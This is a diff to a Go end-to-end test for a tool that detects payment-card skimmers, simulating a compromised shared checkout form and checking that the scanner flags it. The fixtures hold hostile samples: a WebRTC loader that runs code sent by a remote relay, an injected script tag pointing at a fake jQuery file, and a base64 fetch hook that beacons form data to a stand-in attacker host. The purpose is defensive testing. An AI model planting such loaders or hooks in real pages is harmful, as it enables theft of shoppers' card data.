@@ -29,6 +29,7 @@ type internet struct {
 	srv        *httptest.Server
 	port       string
 	cdnVersion atomic.Int32 // 1 = clean library, 2 = library with a skimmer appended (supply-chain swap)
+	formHacked atomic.Bool  // the shared payment form gained one <script> tag (PaperCut)
 	stolen     atomic.Int32
 }
 
@@ -68,6 +69,18 @@ func (in *internet) serve(w http.ResponseWriter, r *http.Request) {
 			lib = strings.ReplaceAll(swappedLib, "PORT", in.port)
 		}
 		js(lib)
+	case host == "cdn.jsdelivr.net":
+		js(papercutLoader)
+	case host == "payform.test" && r.URL.Path == "/HostedFormLoad":
+		extra := ""
+		if in.formHacked.Load() {
+			extra = `<script src="` + in.url("cdn.jsdelivr.net", "/gh/evil0acct/alianet@main/jQuery.1.3.1.js") + `"></script>`
+		}
+		html(`<!doctype html><html><body><form method="post" action="/HostedFormSubmit">
+<input name="cardnumber" autocomplete="cc-number"><input name="cvv" autocomplete="cc-csc"><button>Pagar</button></form>
+<script src="/static/form.js"></script>` + extra + `</body></html>`)
+	case host == "payform.test" && r.URL.Path == "/static/form.js":
+		js(`document.forms[0].addEventListener("submit", function(){ document.querySelector("button").disabled = true; });`)
 	case host == "clean-shop.test":
 		w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self' https://www.googletagmanager.com")
 		w.Header().Set("X-Frame-Options", "DENY")
@@ -87,6 +100,14 @@ func (in *internet) serve(w http.ResponseWriter, r *http.Request) {
 		http.NotFound(w, r)
 	}
 }
+
+// The loader half of PaperCut, defanged: it runs whatever a WebRTC relay at a documentation
+// address sends back, so it steals nothing by itself.
+const papercutLoader = `(function(){
+  var pc = new RTCPeerConnection({iceServers:[{urls:"turn:198.51.100.7:40000"}]});
+  var ch = pc.createDataChannel("j");
+  ch.onmessage = function(e){ (new Function(e.data))(); };
+})();`
 
 // base64 of a small checkout hook, the same family as the Vea skimmer.
 var vtexSkimmerB64 = "d2luZG93LmZldGNoID0gZnVuY3Rpb24odSwgbyl7IG5hdmlnYXRvci5zZW5kQmVhY29uKCJodHRwczovL2NvbGxlY3Rvci5hdHRhY2tlci5pbnZhbGlkL2MiLCBvICYmIG8uYm9keSk7IHJldHVybiB1OyB9Ow=="
@@ -113,6 +134,8 @@ func TestEndToEnd(t *testing.T) {
 		Targets: []config.Target{
 			{Name: "clean-shop", Pages: []string{in.url("clean-shop.test", "/")}},
 			{Name: "shop", Pages: []string{in.url("shop.test", "/producto/aceite"), in.url("shop.test", "/checkout")}},
+			{Name: "payform", Kind: config.KindSharedCheckout, Pages: []string{in.url("payform.test", "/HostedFormLoad")},
+				UsedBy: []string{"diario-uno", "diario-dos"}},
 		},
 	}
 	cfg.Settings.RequestDelay = 10 * time.Millisecond
@@ -122,7 +145,7 @@ func TestEndToEnd(t *testing.T) {
 	if p := chrome(); p != "" {
 		b, err := runtime.NewBrowser(ctx, runtime.BrowserOptions{
 			ExecPath: p, UserAgent: "skimwatch-test", NoSandbox: true, NoProxy: true,
-			HostRules: "MAP *.test 127.0.0.1",
+			HostRules: "MAP *.test 127.0.0.1, MAP cdn.jsdelivr.net 127.0.0.1", // never reach the real CDN from a test
 		})
 		if err != nil {
 			t.Fatal(err)
@@ -165,8 +188,14 @@ func TestEndToEnd(t *testing.T) {
 		t.Error("first scan has no baseline and must not report changes")
 	}
 
+	if _, ok := rules(first["payform"])["user-hosted-script"]; ok {
+		t.Error("the shared form is clean on night one")
+	}
+
 	// Night 2: the CDN is compromised. The library URL is the same; only its content changed.
+	// And someone adds one script tag to the shared payment form.
 	in.cdnVersion.Store(2)
+	in.formHacked.Store(true)
 	second := byTarget(s.Run(ctx))
 	shop2 := rules(second["shop"])
 	if shop2["third-party-script-changed"] != model.Medium {
@@ -182,6 +211,25 @@ func TestEndToEnd(t *testing.T) {
 		if in.stolen.Load() == 0 {
 			t.Error("the fixture skimmer should have fired at least once")
 		}
+	}
+	form := rules(second["payform"])
+	for rule, want := range map[string]model.Severity{
+		"user-hosted-script":     model.Critical, // personal repo + @main + fake jQuery + card page
+		"new-user-hosted-script": model.Critical, // strict baseline on a shared form
+		"webrtc-loader":          model.Critical, // the loader's own code
+	} {
+		if form[rule] != want {
+			t.Errorf("shared form night two: want %s=%s, got %v", rule, want, form)
+		}
+	}
+	var named bool
+	for _, f := range second["payform"].Findings {
+		if f.Rule == "user-hosted-script" && strings.Contains(f.Detail, "diario-uno, diario-dos") {
+			named = true
+		}
+	}
+	if !named {
+		t.Error("findings on a shared form should name the merchants that embed it")
 	}
 	if out := os.Getenv("SKIMWATCH_REPORT_OUT"); out != "" {
 		f, _ := os.Create(out)
